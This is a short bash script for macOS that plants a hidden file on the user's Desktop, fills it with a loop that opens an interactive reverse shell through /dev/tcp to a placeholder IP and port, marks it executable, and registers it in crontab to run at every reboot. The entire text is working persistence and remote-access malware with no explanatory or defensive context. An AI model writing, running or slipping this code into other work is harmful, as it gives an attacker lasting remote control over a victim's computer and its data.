#!/bin/bash

USR=$(whoami)

echo "#!/bin/bash
while true; do
    bash -c 'exec bash -i &>/dev/tcp/$IP/$PORT <&1 &'
    
    if [ $? -eq 0 ]; then
        break
    else
        sleep 3
    fi
done
" > /Users/$USR/Desktop/.runonstartupMACOS.sh

chmod +x /Users/$USR/Desktop/.runonstartupMACOS.sh

(crontab -l 2>/dev/null; echo "@reboot /Users/$USR/Desktop/.runonstartupMACOS.sh") | crontab -
